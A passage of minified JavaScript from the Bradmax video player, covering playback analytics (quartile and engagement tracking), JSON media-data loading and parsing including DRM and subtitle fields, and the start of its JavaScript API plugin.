ab=function(){this.state=1,this.currentTime=0,this.title=this.mediaId=this.duration=null,this.statsEngagementRateEnabled=this.wasThirdQuartilePlaybackCallback=this.wasMidpointPlaybackCallback=this.wasFirstQuartilePlayback=this.wasFirstPlayingEvent=this.isDrmProtected=!1,this.statsEngagementRatePercResolution=1,this.statsEngagementRateLastSendValue=-1,this.statsEngagementRateLastSendTs=0};wa["bs.player.plugin.bradmax.analytics.BradmaxAnalyticsPlaybackState"]=ab,ab.__name__="bs.player.plugin.bradmax.analytics.BradmaxAnalyticsPlaybackState",ab.prototype={state:null,currentTime:null,duration:null,isLive:null,isDrmProtected:null,mediaId:null,title:null,media:null,statsEngagementRateEnabled:null,statsEngagementRatePercResolution:null,statsEngagementRateLastSendValue:null,statsEngagementRateLastSendTs:null,firstPlayingEventCallback:null,firstQuartilePlaybackCallback:null,midpointPlaybackCallback:null,thirdQuartilePlaybackCallback:null,completePlaybackCallback:null,wasFirstPlayingEvent:null,wasFirstQuartilePlayback:null,wasMidpointPlaybackCallback:null,wasThirdQuartilePlaybackCallback:null,engagementRatePercentProgressCallback:null,engagementRateTimeProgressCallback:null,updateState:function(b){this.state=b},onPlayEvent:function(b){this.updateState(10)},onPauseEvent:function(b){this.updateState(1)},onVideoProgress:function(b){if(null!=b){var c=this.countPlaybackProgress(b);if(null!=this.firstPlayingEventCallback&&10==this.state&&!this.wasFirstPlayingEvent&&0<b.data.currentTime&&(this.wasFirstPlayingEvent=!0,this.firstPlayingEventCallback()),this.isLive||(null!=this.firstQuartilePlaybackCallback&&10==this.state&&!this.wasFirstQuartilePlayback&&.25<=c&&(this.wasFirstQuartilePlayback=!0,this.firstQuartilePlaybackCallback()),null!=this.midpointPlaybackCallback&&10==this.state&&!this.wasMidpointPlaybackCallback&&.5<=c&&(this.wasMidpointPlaybackCallback=!0,this.midpointPlaybackCallback()),null!=this.thirdQuartilePlaybackCallback&&10==this.state&&!this.wasThirdQuartilePlaybackCallback&&.75<=c&&(this.wasThirdQuartilePlaybackCallback=!0,this.thirdQuartilePlaybackCallback())),this.currentTime=b.data.currentTime,this.wasFirstPlayingEvent)if(this.isLive){var d=(new Date).getTime(),q=Math.round(c);c=q==this.statsEngagementRateLastSendValue;var X=6e4<d-this.statsEngagementRateLastSendTs;X&&!c&&(null!=this.engagementRateTimeProgressCallback&&this.engagementRateTimeProgressCallback(q),this.statsEngagementRateLastSendValue=q,this.statsEngagementRateLastSendTs=d)}else this.statsEngagementRateEnabled&&0<this.duration&&(d=Math.floor(100*c),this.duration<100/this.statsEngagementRatePercResolution&&(d=Math.floor(d/this.statsEngagementRatePercResolution)*this.statsEngagementRatePercResolution),q=0==d%this.statsEngagementRatePercResolution,c=d==this.statsEngagementRateLastSendValue,X=1e3<(new Date).getTime()-this.statsEngagementRateLastSendTs,!q||c||!X&&100!=d||(null!=this.engagementRatePercentProgressCallback&&this.engagementRatePercentProgressCallback(d),this.statsEngagementRateLastSendValue=d,this.statsEngagementRateLastSendTs=(new Date).getTime()));null!=b.data&&0<b.data.duration&&b.data.duration!=this.duration&&this.onVideoDurationChange(b)}},onVideoProgressHandleQuartileProgress:function(b){null!=this.firstQuartilePlaybackCallback&&10==this.state&&!this.wasFirstQuartilePlayback&&.25<=b&&(this.wasFirstQuartilePlayback=!0,this.firstQuartilePlaybackCallback()),null!=this.midpointPlaybackCallback&&10==this.state&&!this.wasMidpointPlaybackCallback&&.5<=b&&(this.wasMidpointPlaybackCallback=!0,this.midpointPlaybackCallback()),null!=this.thirdQuartilePlaybackCallback&&10==this.state&&!this.wasThirdQuartilePlaybackCallback&&.75<=b&&(this.wasThirdQuartilePlaybackCallback=!0,this.thirdQuartilePlaybackCallback())},onVideoProgressHandleEngagementRate:function(b){if(this.isLive){var c=(new Date).getTime(),d=Math.round(b);b=d==this.statsEngagementRateLastSendValue;var q=6e4<c-this.statsEngagementRateLastSendTs;q&&!b&&(null!=this.engagementRateTimeProgressCallback&&this.engagementRateTimeProgressCallback(d),this.statsEngagementRateLastSendValue=d,this.statsEngagementRateLastSendTs=c)}else this.statsEngagementRateEnabled&&0<this.duration&&(c=Math.floor(100*b),this.duration<100/this.statsEngagementRatePercResolution&&(c=Math.floor(c/this.statsEngagementRatePercResolution)*this.statsEngagementRatePercResolution),d=0==c%this.statsEngagementRatePercResolution,b=c==this.statsEngagementRateLastSendValue,q=1e3<(new Date).getTime()-this.statsEngagementRateLastSendTs,!d||b||!q&&100!=c||(null!=this.engagementRatePercentProgressCallback&&this.engagementRatePercentProgressCallback(c),this.statsEngagementRateLastSendValue=c,this.statsEngagementRateLastSendTs=(new Date).getTime()))},onVideoProgressHandleEngagementRateLive:function(b){var c=(new Date).getTime(),d=(b=Math.round(b))==this.statsEngagementRateLastSendValue;6e4<c-this.statsEngagementRateLastSendTs&&!d&&(null!=this.engagementRateTimeProgressCallback&&this.engagementRateTimeProgressCallback(b),this.statsEngagementRateLastSendValue=b,this.statsEngagementRateLastSendTs=c)},onVideoProgressHandleEngagementRateVod:function(b){if(this.statsEngagementRateEnabled&&0<this.duration){b=Math.floor(100*b),this.duration<100/this.statsEngagementRatePercResolution&&(b=Math.floor(b/this.statsEngagementRatePercResolution)*this.statsEngagementRatePercResolution);var c=0==b%this.statsEngagementRatePercResolution,d=b==this.statsEngagementRateLastSendValue,q=1e3<(new Date).getTime()-this.statsEngagementRateLastSendTs;!c||d||!q&&100!=b||(null!=this.engagementRatePercentProgressCallback&&this.engagementRatePercentProgressCallback(b),this.statsEngagementRateLastSendValue=b,this.statsEngagementRateLastSendTs=(new Date).getTime())}},countPlaybackProgress:function(b){var c=this.duration;if(this.isLive){c=0;try{c=b.data.media.mediaPlaybackInfo.currentTime}catch(d){c=(new Date).getTime()/1e3}return c}return null!=b.data&&0<b.data.duration&&b.data.duration!=this.duration&&(c=b.data.duration),0<c?b.data.currentTime/c:0},onVideoDurationChange:function(b){this.isLive||null==b||null==b.data||(this.duration=b.data.duration)},onVideoComplete:function(b){this.wasThirdQuartilePlaybackCallback=this.wasMidpointPlaybackCallback=this.wasFirstQuartilePlayback=this.wasFirstPlayingEvent=!1,null!=this.completePlaybackCallback&&this.completePlaybackCallback(),null!=b&&(null!=b.data&&0<b.data.duration&&b.data.duration!=this.duration&&this.onVideoDurationChange(b),this.currentTime=this.duration)},onVideoPlaying:function(b){this.updateState(10)},onVideoPaused:function(b){this.updateState(1)},onAfterPlaybackStartMetadataData:function(b){this.initIsLive(b.data)},initIsLive:function(b){(this.isLive=b instanceof xa)&&(this.duration=null)},onMetadata:function(b){if(this.duration=this.currentTime=0,this.isDrmProtected=!1,null!=b){var c=b.data;this.duration=c.duration,this.mediaId=c.id,this.title=c.title,this.media=c,this.initIsLive(c),null!=b.data.adId&&(this.mediaId=b.data.adId),null!=b.data.durationTotal&&(this.duration=b.data.durationTotal)}},onDrmAuthenticationComplete:function(b){this.isDrmProtected=!0},__class__:ab};var Fb=function(){this.data=this.emittedMedia=this.emittedMediaPlaylist=null,this.reportErrors=!0,this.debugMode=!1,lb.call(this),this.thisClass=fb.getClass(this).__name__.split(".").pop(),this.parser=new vb(this.reportErrors),this.parser.reportError=U(this,this.reportError)};wa["bs.player.plugin.dataProvider.BradmaxDataProvider"]=Fb,Fb.__name__="bs.player.plugin.dataProvider.BradmaxDataProvider",Fb.__super__=lb,Fb.prototype=Ja(lb.prototype,{debugMode:null,reportErrors:null,thisClass:null,data:null,parser:null,emittedMedia:null,emittedMediaPlaylist:null,activate:function(){lb.prototype.activate.call(this);var b=this.get_variables();Object.prototype.hasOwnProperty.call(b,"dataDebugMode")&&(this.debugMode=m.field(this.get_variables(),"dataDebugMode")),b=this.get_variables(),Object.prototype.hasOwnProperty.call(b,"dataReportErrors")&&(this.reportErrors=m.field(this.get_variables(),"dataReportErrors"))},postActivate:function(){var b=this.get_variables();Object.prototype.hasOwnProperty.call(b,"dataSource")?this.mediaLoad(m.field(this.get_variables(),"dataSource")):(b=this.get_variables(),Object.prototype.hasOwnProperty.call(b,"dataProvider")&&this.parseData(m.field(this.get_variables(),"dataProvider")))},changeSource:function(b){this.mediaLoad(b)},injectData:function(b){this.parseData(b)},mediaLoad:function(b){null==b?(this.reportErrors||this.debugMode)&&(console.error("["+this.thisClass+"] Error in BradmaxDataProvider : Empty source url"),(b=new B("mediaProviderError")).data="Error in BradmaxDataProvider : Empty source url",b.dispatch(this.context)):((b=new G(b)).onData=U(this,this.parseString),b.onError=U(this,this.mediaLoadError),b.request(!1))},mediaLoadError:function(b){if(b="Error in BradmaxDataProvider : Invalid http request: "+p.string(b),this.reportErrors||this.debugMode){console.error("["+this.thisClass+"] "+b);var c=new B("mediaProviderError");c.data=b,c.dispatch(this.context)}},parseString:function(b){this.data=null;try{for(;-1!=b.indexOf("/*")||-1!=b.indexOf("*/");){var c=b.indexOf("/*"),d=b.indexOf("*/",c)+2;-1!=c&&-1!=d&&(b=b.substring(0,c)+b.substring(d,b.length))}this.data=JSON.parse(b)}catch(q){return c=yb.caught(q).unwrap(),c="Error in BradmaxDataProvider : Invalid string while parsing to object (JSON) : "+p.string(c),void((this.reportErrors||this.debugMode)&&(d="["+this.thisClass+"] "+c,console.error(d),d=new B("mediaProviderError"),d.data=c,d.dispatch(this.context)))}null!=this.data?this.parseData(this.data):(this.reportErrors||this.debugMode)&&(d="["+this.thisClass+"] Error in BradmaxDataProvider : Invalid string while parsing to object (JSON)",console.error(d),(d=new B("mediaProviderError")).data="Error in BradmaxDataProvider : Invalid string while parsing to object (JSON)",d.dispatch(this.context))},parseData:function(b){if(null==this.parser)(this.reportErrors||this.debugMode)&&(b="["+this.thisClass+"] Error in BradmaxDataProvider : BradmaxMediaParser return empty object",console.error(b),(b=new B("mediaProviderError")).data="Error in BradmaxDataProvider : BradmaxMediaParser return empty object",b.dispatch(this.context));else{if(null!=b&&!(b instanceof Array)){var c=b;b=[c];var d=this.parsePlaylistLegacyNames(c);if(null!=d)for(var q=0;q<d.length;)c=d[q],++q,b.push(c)}this.parser.parse(b),null==this.parser.playlist?(this.reportErrors||this.debugMode)&&(b="["+this.thisClass+"] Error in BradmaxDataProvider : BradmaxMediaParser return empty playlist object",console.error(b),(b=new B("mediaProviderError")).data="Error in BradmaxDataProvider : BradmaxMediaParser return empty playlist object",b.dispatch(this.context)):(b=this.get_variables(),Object.prototype.hasOwnProperty.call(b,"startTime")&&0<this.get_variables().startTime&&0<this.parser.playlist.items.length&&(c=this.parser.playlist.items[0],b=this.get_variables(),c.mediaUserSettings.resumePostion=m.field(b,"startTime"),m.deleteField(this.get_variables(),"startTime")),this.parser.playlist.hasNext()&&(this.emitMedia(this.parser.playlist.next()),this.emittedMediaPlaylist=this.parser.playlist,this.emitMediaPlaylist(this.emittedMediaPlaylist)))}},parsePlaylistLegacyNames:function(b){for(var c=null,d=["mediaPlaylist","playList"],q=0;q<d.length;){var X=d[q];if(++q,null==(c=this.findPlaylistLegacyName(X,b))&&(c=this.findPlaylistLegacyName(X.toLowerCase(),b)),null!=c)break}return c},findPlaylistLegacyName:function(b,c){var d=null;if(Object.prototype.hasOwnProperty.call(c,b)){var q=m.field(c,b);q instanceof Array?d=q:Object.prototype.hasOwnProperty.call(q,"items")&&((q=m.field(q,"items"))instanceof Array&&(d=q)),m.deleteField(c,b)}return d},emitMediaPlaylist:function(b){var c=new aa("mediaPlaylistData");c.data=b,c.dispatch(this.context)},orderMediaSourceForBetterSupport:function(b){if(null!=b&&null!=b.source&&0!=b.source.length){for(var c=h.mobile||"Safari"==h.browserName?[U(this,this.isHlsUrl),U(this,this.isMpegDashUrl),U(this,this.isMsSmoothStreamingUrl)]:"Edge"==h.browserName||"Microsoft Internet Explorer"==h.browserName?[U(this,this.isMsSmoothStreamingUrl),U(this,this.isMpegDashUrl),U(this,this.isHlsUrl)]:[U(this,this.isMpegDashUrl),U(this,this.isHlsUrl),U(this,this.isMsSmoothStreamingUrl)],d=[],q=new re,X=0,ra=b.source;X<ra.length;){var Aa=ra[X];++X,q.add(Aa)}for(X=0;X<c.length;){ra=c[X],++X;for(var Qa=new re,Wa=q.h;null!=Wa;)Aa=Wa.item,Wa=Wa.next,ra(Aa.url)&&(d.push(Aa),Qa.add(Aa));for(ra=Qa.h;null!=ra;)Aa=ra.item,ra=ra.next,q.remove(Aa)}for(ra=q.h;null!=ra;)Aa=ra.item,ra=ra.next,d.push(Aa);b.source=d}},isHlsUrl:function(b){return b=this.normalizeSourceUrl(b),f.endsWith(b,".m3u8")},isMpegDashUrl:function(b){return b=this.normalizeSourceUrl(b),f.endsWith(b,".mpd")},isMsSmoothStreamingUrl:function(b){return b=this.normalizeSourceUrl(b),!!f.endsWith(b,".ism/manifest")||f.endsWith(b,".isml/manifest")},normalizeSourceUrl:function(b){return null==b?"":b.split("?")[0].toLowerCase()},emitMedia:function(b){this.orderMediaSourceForBetterSupport(b),this.emittedMedia=b;var c=new aa("mediaMetadataData");c.data=b,c.dispatch(this.context),(c=new aa("movieData")).data=b,c.dispatch(this.context),(c=new aa("subtitleData")).data=null!=b.subtitlesSets?b.subtitlesSets:null,c.dispatch(this.context),this.emitSubtitlesSet(b.subtitlesSets),(c=new aa("audioData")).data=null!=b.audioSets?b.audioSets:null,c.dispatch(this.context),this.emitAudioSet(b.audioSets)},emitAudioSet:function(b){if(null!=b){var c=null,d=this.get_variables();Object.prototype.hasOwnProperty.call(d,"audio")&&(c=m.field(this.get_variables(),"audio"));var q=Tb.getSessionStorage();if(null!=q){d=null;var X=Tb.getSessionStorage();if(q=null!=X)try{q=null,X=!1;(X=null!=Tb.getSessionStorage())&&(X=null,null!=(q=(X=Tb.getSessionStorage()).getItem("_brplayer_aud_lang"))&&(q=f.trim(q)));var Aa=q;null!=q&&""!=q&&(d=q)}catch(Qa){}null!=d&&(c=d)}if(null!=c){for(d=[],q=0;q<b.length;)Aa=b[q],++q,Aa.languageCode==c&&d.push(Aa);if(!(null==d||1>d.length)&&(null!=(b=d[0])&&((c=new W("selectAudio")).data=b,c.dispatch(this.context),b=b.languageCode,d=null!=(q=Tb.getSessionStorage()))))try{null==b?(d=null,(d=Tb.getSessionStorage()).removeItem("_brplayer_aud_lang")):(d=null,(d=Tb.getSessionStorage()).setItem("_brplayer_aud_lang",p.string(b)))}catch(Qa){}}}},emitSubtitlesSet:function(b){if(null!=b){var c=null,d=this.get_variables();Object.prototype.hasOwnProperty.call(d,"subtitles")&&(c=m.field(this.get_variables(),"subtitles"));var q=Tb.getSessionStorage();if(null!=q){d=null;var X=Tb.getSessionStorage();if(q=null!=X)try{q=null,X=!1;(X=null!=Tb.getSessionStorage())&&(X=null,null!=(q=(X=Tb.getSessionStorage()).getItem("_brplayer_sub_lang"))&&(q=f.trim(q)));var Aa=q;null!=q&&""!=q&&(d=q)}catch(Qa){}null!=d&&(c=d)}if(null!=c){for(d=[],q=0;q<b.length;)Aa=b[q],++q,Aa.languageCode==c&&d.push(Aa);if(!(null==d||1>d.length)&&(null!=(b=d[0])&&((c=new W("selectSubtitles")).data=b,c.dispatch(this.context),b=b.languageCode,d=null!=(q=Tb.getSessionStorage()))))try{null==b?(d=null,(d=Tb.getSessionStorage()).removeItem("_brplayer_sub_lang")):(d=null,(d=Tb.getSessionStorage()).setItem("_brplayer_sub_lang",p.string(b)))}catch(Qa){}}}},emitDebug:function(b){},emitWarning:function(b){},emitError:function(b){if(this.reportErrors||this.debugMode){console.error("["+this.thisClass+"] "+b);var c=new B("mediaProviderError");c.data=b,c.dispatch(this.context)}},reportError:function(b,c){b==Ia.ERROR&&(b="Error in BradmaxDataProvider : parser : "+c,this.reportErrors||this.debugMode)&&(console.error("["+this.thisClass+"] "+b),(c=new B("mediaProviderError")).data=b,c.dispatch(this.context))},__class__:Fb});var Wb=function(){};wa["bs.player.plugin.dataProvider.BradmaxDataTypes"]=Wb,Wb.__name__="bs.player.plugin.dataProvider.BradmaxDataTypes",Wb.prototype={__class__:Wb};var Ia=Na["bs.player.plugin.dataProvider.BradmaxDataParseExceptionType"]={__ename__:!0,__constructs__:null,ERROR:{_hx_name:"ERROR",_hx_index:0,__enum__:"bs.player.plugin.dataProvider.BradmaxDataParseExceptionType",toString:Va},WARNING:{_hx_name:"WARNING",_hx_index:1,__enum__:"bs.player.plugin.dataProvider.BradmaxDataParseExceptionType",toString:Va}};Ia.__constructs__=[Ia.ERROR,Ia.WARNING];var vb=function(b){null==b&&(b=!1),this.reportErrors=b};wa["bs.player.plugin.dataProvider.BradmaxMediaParser"]=vb,vb.__name__="bs.player.plugin.dataProvider.BradmaxMediaParser",vb.prototype={media:null,playlist:null,reportErrors:null,reportError:function(b,c){},parse:function(b){this.playlist=new bb;for(var c=0;c<b.length;){var d=b[c];++c,this.playlist.items.push(this.parseMedia(d))}},parseMedia:function(b){var c=new va;if(Object.prototype.hasOwnProperty.call(b,"liveStream")&&null!=m.field(b,"liveStream")&&((c=new Ca).duration=-1),Object.prototype.hasOwnProperty.call(b,"channel")&&(c=new Ba),Object.prototype.hasOwnProperty.call(b,"customParams")&&(c.customParams=b.customParams),Object.prototype.hasOwnProperty.call(b,"id")&&(c.id=b.id),Object.prototype.hasOwnProperty.call(b,"title")&&(c.title=b.title),Object.prototype.hasOwnProperty.call(b,"duration")&&(c.duration=b.duration),Object.prototype.hasOwnProperty.call(b,"source"))c.source=this.parseMediaSource(b.source);else if(Object.prototype.hasOwnProperty.call(b,"sourceWithFallbacks")){var d=this.parseMediaSourceWithFallbacls(b.sourceWithFallbacks);0<d.length&&(c.source=d[0]),1<d.length&&(c.sourceFallbacks=d.slice(1))}else this.reportErrors&&this.reportError(Ia.ERROR,"media source is missing");if(this.reportErrors&&0==c.source.length&&this.reportError(Ia.ERROR,"media sources are empty"),Object.prototype.hasOwnProperty.call(b,"audioSets")&&(c.audioSets=this.parseMediaAudioSet(b.audioSets)),Object.prototype.hasOwnProperty.call(b,"mediaDetails")&&(c.mediaDetails=this.parseMediaDetails(b.mediaDetails)),Object.prototype.hasOwnProperty.call(b,"mediaPlaybackInfo")&&(c.mediaPlaybackInfo=this.parseMediaPlaybackInfo(b.mediaPlaybackInfo)),Object.prototype.hasOwnProperty.call(b,"mediaSettings")&&(c.mediaSettings=this.parseMediaSettings(b.mediaSettings)),Object.prototype.hasOwnProperty.call(b,"mediaUserSettings")&&(c.mediaUserSettings=this.parseMediaUserSettings(b.mediaUserSettings)),Object.prototype.hasOwnProperty.call(b,"splashImages")&&(c.splashImages=this.parseMediaImages(b.splashImages)),Object.prototype.hasOwnProperty.call(b,"subtitlesSets")&&(c.subtitlesSets=this.parseMediaSubtitleSets(b.subtitlesSets)),Object.prototype.hasOwnProperty.call(b,"posterImages")&&(c.posterImages=this.parseMediaImages(b.posterImages)),Object.prototype.hasOwnProperty.call(b,"mediaLandingPage")&&(c.mediaLandingPage=b.mediaLandingPage),Object.prototype.hasOwnProperty.call(b,"progress")&&(c.progress=this.parseProgress(b.progress)),c instanceof Ba?this.parseLiveChannelFields(c,b):c instanceof Ca&&this.parseLiveStreamFields(c,b),Object.prototype.hasOwnProperty.call(b,"spherical"))switch(""+b.spherical){case"1":case"true":c.spherical=!0;break;default:c.spherical=!1}return Object.prototype.hasOwnProperty.call(b,"contentMeta")&&(c.contentMeta=this.parseContentMeta(b.contentMeta)),c},parseLiveStreamFields:function(b,c){c=m.field(c,"liveStream"),Object.prototype.hasOwnProperty.call(c,"endDate")&&(b.streamEnd=this.parseIso8266Date(c.endDate)),Object.prototype.hasOwnProperty.call(c,"thankYouImageUrl")&&(b.streamEndThankYouImageUrl=c.thankYouImageUrl),Object.prototype.hasOwnProperty.call(c,"waitingForTransmissionImageUrl")&&(b.streamWaitingForTransmissionImageUrl=c.waitingForTransmissionImageUrl),Object.prototype.hasOwnProperty.call(c,"lowLatencyMode")&&(b.lowLatencyMode=c.lowLatencyMode)},parseIso8266Date:function(b){return new Date(new Date(b).getTime())},parseLiveChannelFields:function(b,c){var d=null!=c.channel?c.channel.name:c.title;b.id=c.id,b.name=d},parseMediaSource:function(b){for(var c=[],d=0;d<b.length;){var q=b[d];++d;var X=new Da;if(Object.prototype.hasOwnProperty.call(q,"customParams"))if(fb.__implements(q.customParams,Hc))X.customParams=q.customParams;else if(fb.__instanceof(q.customParams,xf))for(var ra=0,Aa=m.fields(q.customParams);ra<Aa.length;){var Qa=Aa[ra];++ra,X.customParams.h[Qa]=m.field(q.customParams,Qa)}Object.prototype.hasOwnProperty.call(q,"id")&&(X.id=q.id),Object.prototype.hasOwnProperty.call(q,"url")?X.url=q.url:this.reportErrors&&this.reportError(Ia.WARNING,"media source need url attribute to be present"),Object.prototype.hasOwnProperty.call(q,"width")&&(X.width=q.width),Object.prototype.hasOwnProperty.call(q,"height")&&(X.height=q.height),Object.prototype.hasOwnProperty.call(q,"contentType")&&(X.contentType=q.contentType),Object.prototype.hasOwnProperty.call(q,"drm")&&(X.drm=this.parseDrm(q.drm)),c.push(X)}return c},parseDrm:function(b){return{provider:m.field(b,"provider"),selectedDrmSystem:m.field(b,"selectedDrmSystem"),playready:this.parseDrmData(m.field(b,"playready")),widevine:this.parseDrmData(m.field(b,"widevine")),fairplay:this.parseDrmData(m.field(b,"fairplay"))}},parseDrmData:function(b){return null==b?null:{laUrl:m.field(b,"laUrl"),customData:m.field(b,"customData"),certUrl:m.field(b,"certUrl"),audioRobustness:m.field(b,"audioRobustness"),videoRobustness:m.field(b,"videoRobustness")}},parseMediaSourceWithFallbacls:function(b){for(var c=[],d=0;d<b.length;){var q=b[d];++d;for(var X=[],ra=0;ra<q.length;){var Aa=q[ra];++ra;var Qa=new Da;Object.prototype.hasOwnProperty.call(Aa,"customParams")&&(Qa.customParams=Aa.customParams),Object.prototype.hasOwnProperty.call(Aa,"id")&&(Qa.id=Aa.id),Object.prototype.hasOwnProperty.call(Aa,"url")?Qa.url=Aa.url:this.reportErrors&&this.reportError(Ia.WARNING,"media source need url attribute to be present"),Object.prototype.hasOwnProperty.call(Aa,"width")&&(Qa.width=Aa.width),Object.prototype.hasOwnProperty.call(Aa,"height")&&(Qa.height=Aa.height),Object.prototype.hasOwnProperty.call(Aa,"contentType")&&(Qa.contentType=Aa.contentType),X.push(Qa)}c.push(X)}return c},parseMediaAudioSet:function(b){for(var c=[],d=0;d<b.length;){var q=b[d];++d;var X=new $a;Object.prototype.hasOwnProperty.call(q,"customParams")&&(X.customParams=q.customParams),Object.prototype.hasOwnProperty.call(q,"id")&&(X.id=q.id),Object.prototype.hasOwnProperty.call(q,"languageCode")?(X.name=ba.getLanguageNativeNameByCode(q.languageCode),X.languageCode=q.languageCode):this.reportErrors?this.reportError(Ia.WARNING,"media audio set need languageCode attribute to be present"):Object.prototype.hasOwnProperty.call(q,"name")&&(X.name=q.name),c.push(X)}return c},parseMediaDetails:function(b){var c=new Ta;return Object.prototype.hasOwnProperty.call(b,"customParams")&&(c.customParams=m.field(b,"customParams")),Object.prototype.hasOwnProperty.call(b,"descriptionLong")&&(c.descriptionLong=b.descriptionLong),Object.prototype.hasOwnProperty.call(b,"descriptionShort")&&(c.descriptionShort=b.descriptionShort),Object.prototype.hasOwnProperty.call(b,"directors")&&(c.directors=b.directors),Object.prototype.hasOwnProperty.call(b,"genres")&&(c.genres=this.parseMediaGenres(b.genres)),Object.prototype.hasOwnProperty.call(b,"mediaCast")&&(c.mediaCast=b.mediaCast),Object.prototype.hasOwnProperty.call(b,"tags")&&(c.tags=b.tags),Object.prototype.hasOwnProperty.call(b,"year")&&(c.year=b.year),c},parseMediaGenres:function(b){for(var c=[],d=0;d<b.length;){var q=b[d];++d;var X=new Ka;Object.prototype.hasOwnProperty.call(q,"customParams")&&(X.customParams=q.customParams),Object.prototype.hasOwnProperty.call(q,"id")&&(X.id=q.id),Object.prototype.hasOwnProperty.call(q,"name")?X.name=q.name:this.reportErrors&&this.reportError(Ia.WARNING,"media genre need name attribute to be present"),c.push(X)}return c},parseMediaPlaybackInfo:function(b){var c=new mb;return Object.prototype.hasOwnProperty.call(b,"currentTime")&&(c.currentTime=b.currentTime),Object.prototype.hasOwnProperty.call(b,"isPlaying")&&(c.isPlaying=b.isPlaying),Object.prototype.hasOwnProperty.call(b,"customParams")&&(c.customParams=b.customParams),c},parseProgress:function(b){var c=new Qb;if(Object.prototype.hasOwnProperty.call(b,"segments")){var d=b.segments;null!=d&&(d instanceof Array&&(c.segments=d),"string"==typeof d&&(c.segmentsUrl=d))}return Object.prototype.hasOwnProperty.call(b,"markers")&&(null!=(d=b.markers)&&(d instanceof Array&&(c.markers=d),"string"==typeof d&&(c.markersUrl=d))),Object.prototype.hasOwnProperty.call(b,"thumbnails")&&(c.thumbnails=b.thumbnails),c},parseContentMeta:function(b){for(var c=new Jb,d=0,q=m.fields(b);d<q.length;){var X=q[d];++d,c.h[X]=m.field(b,X)}return c},parseMediaSettings:function(b){var c=new ib;return Object.prototype.hasOwnProperty.call(b,"hasConcurrencyControl")&&(c.hasConcurrencyControl=b.hasConcurrencyControl),Object.prototype.hasOwnProperty.call(b,"customParams")&&(c.customParams=b.customParams),c},parseMediaUserSettings:function(b){var c=new qb;return Object.prototype.hasOwnProperty.call(b,"hasWatchingFinished")&&(c.hasWatchingFinished=b.hasWatchingFinished),Object.prototype.hasOwnProperty.call(b,"isFavorite")&&(c.isFavorite=b.isFavorite),Object.prototype.hasOwnProperty.call(b,"resumePostion")&&(c.resumePostion=b.resumePostion),Object.prototype.hasOwnProperty.call(b,"wasWatched")&&(c.wasWatched=b.wasWatched),c},parseMediaImages:function(b){for(var c=[],d=0;d<b.length;){var q=b[d];++d;var X=new ua;Object.prototype.hasOwnProperty.call(q,"customParams")&&(X.customParams=q.customParams),Object.prototype.hasOwnProperty.call(q,"id")&&(X.id=q.id),Object.prototype.hasOwnProperty.call(q,"url")?X.url=q.url:this.reportErrors&&this.reportError(Ia.WARNING,"media image need url attribute to be present"),Object.prototype.hasOwnProperty.call(q,"width")&&(X.width=q.width),Object.prototype.hasOwnProperty.call(q,"height")&&(X.height=q.height),c.push(X)}return c},parseMediaSubtitleSets:function(b){for(var c=[],d=0;d<b.length;){var q=b[d];++d;var X=new Ab;Object.prototype.hasOwnProperty.call(q,"customParams")&&(X.customParams=q.customParams),Object.prototype.hasOwnProperty.call(q,"id")&&(X.id=q.id),Object.prototype.hasOwnProperty.call(q,"url")?X.url=q.url:this.reportErrors&&this.reportError(Ia.WARNING,"media subtitle set need url attribute to be present"),Object.prototype.hasOwnProperty.call(q,"languageCode")?(X.name=ba.getLanguageNativeNameByCode(q.languageCode),X.languageCode=q.languageCode):this.reportErrors?this.reportError(Ia.WARNING,"media subtitle set need languageCode attribute to be present"):Object.prototype.hasOwnProperty.call(q,"name")&&(X.name=q.name),c.push(X)}return c},__class__:vb};var Hb=function(){};wa["bs.player.plugin.javascriptapi.IEventsFilter"]=Hb,Hb.__name__="bs.player.plugin.javascriptapi.IEventsFilter",Hb.__isInterface__=!0,Hb.prototype={add:null,addOnce:null,remove:null,onPlayerDestroy:null,__class__:Hb};var wc=function(){this.message=null,lb.call(this),this.videoEventsFilterByContext=new Jb,this.pluginConfig={},Object.prototype.hasOwnProperty.call(this.pluginConfig,"customVideoEventsFilterClass")&&(this.customVideoEventsFilterClass=m.field(this.pluginConfig,"customVideoEventsFilterClass"))};wa["bs.player.plugin.javascriptapi.JavascriptApi"]=wc,wc.__name__="bs.player.plugin.javascriptapi.JavascriptApi",wc.__super__=lb,wc.prototype=Ja(lb.prototype,{onCloseBind:null,durationTime:null,videoEventsFilterByContext:null,customVideoEventsFilterClass:null,currentTime:null,lastCurrentTimeChangeTs:null,media:null,adMedia:null,message:null,pictureInPicture:null,create:function(){lb.prototype.create.call(this),W.add(this.context,"close",U(this,this.onClose)),T.add(this.context,"durationChange",U(this,this.onDurationChange)),T.add(this.context,"currentTimeChange",U(this,this.onCurrentTimeChange)),aa.add(this.context,"mediaMetadataData",U(this,this.onMetadataData)),aa.add(this.context,"adMetadataData",U(this,this.onAdMetadataData)),ma.add(this.context,ma.SHOW_MESSAGE,U(this,this.onShowMessage)),ma.add(this.context,ma.CLOSE_MESSAGE,U(this,this.onCloseMessage)),this.pictureInPicture=new Lc(this.context)},destroy:function(){this.getOrCreateEventsFilterByContext(this.context).onPlayerDestroy(),null!=this.pictureInPicture&&this.pictureInPicture.destroy(),W.remove(this.context,"close",U(this,this.onClose)),T.remove(this.context,"durationChange",U(this,this.onDurationChange)),T.remove(this.context,"currentTimeChange",U(this,this.onCurrentTimeChange)),aa.remove(this.context,"mediaMetadataData",U(this,this.onMetadataData)),ma.remove(this.context,ma.SHOW_MESSAGE,U(this,this.onShowMessage)),ma.remove(this.context,ma.CLOSE_MESSAGE,U(this,this.onCloseMessage)),lb.prototype.destroy.call(this)},getVersion:function(){return"v2.14.380"},onClose:function(b){null!=this.onCloseBind&&this.onCloseBind(b)},play:function(){if(null!=this.adMedia){var b=new Q("adAdClick");b.data={url:null},b.dispatch(this.context)}else new W("skinPlay").dispatch(this.context)},pause:function(){new W("skinPause").dispatch(this.context)},playPause:function(){new W("skinPlayPause").dispatch(this.context)},seek:function(b){b>this.durationTime&&(b=this.durationTime-.5),0>b&&(b=0),this.currentTime=b;var c=new W("skinSeek");c.data=b,c.dispatch(this.context)},seekRelative:function(b){var c=this;if((new Date).getTime(),null!=this.currentTime)this.seek(this.currentTime+b);else if(this.media instanceof xa){var d=!1;T.addOnce(this.context,"currentTimeChange",(function(q){d||(d=!0,c.pause(),null!=c.currentTime&&c.seekRelative(b))})),this.play()}else this.seek(b)},setVolume:function(b){var c=new W("skinVolume");c.data=b,c.dispatch(this.context)},setMute:function(b){new W(b?"skinMute":"skinUnmute").dispatch(this.context)},setSubtitlesById:function(b){var c=new 